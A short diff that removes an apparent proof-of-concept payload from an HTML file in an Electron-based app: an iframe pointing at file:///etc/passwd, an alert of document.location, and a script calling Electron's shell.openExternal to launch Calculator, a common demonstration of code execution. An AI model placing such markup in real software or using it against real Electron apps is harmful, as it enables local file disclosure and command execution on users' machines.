@@ -1,9 +1,0 @@
-<iframe src="file:///etc/passwd"></iframe>
-<button onclick=alert(document.location)>Location</button>
-<button onclick=pwn()>RCE?</button>
-<script>
-	function pwn() {
-		const {shell} = require('electron');
-		shell.openExternal('file:///Applications/Calculator.app');
-	}
-</script>
